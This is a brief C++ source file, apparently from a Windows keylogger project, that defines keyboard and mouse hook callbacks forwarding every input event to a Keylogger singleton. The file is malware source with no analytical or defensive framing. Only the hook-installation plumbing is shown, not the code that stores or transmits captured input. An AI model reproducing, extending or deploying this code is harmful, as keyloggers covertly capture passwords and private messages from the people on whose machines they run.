#include "Keylogger.hpp"

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);

	Keylogger::getInstance().onKeyboardEvent(code, wParam, lParam);
	return CallNextHookEx(Keylogger::getInstance().m_hook, code, wParam, lParam);
}

LRESULT MouseHookFunction(int code, WPARAM wParam, LPARAM lParam)
{
	Keylogger::getInstance().onMouseEvent(code, wParam, lParam);
	return CallNextHookEx(Keylogger::getInstance().m_hook_mouse, code, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int code, WPARAM wParam, LPARAM lParam)
{
	if (code < 0)
		return CallNextHookEx(NULL, code, wParam, lParam);
	else if (code == HC_ACTION)
		return MouseHookFunction(code, wParam, lParam);

	return CallNextHookEx(Keylogger::getInstance().m_hook_mouse, code, wParam, lParam);
}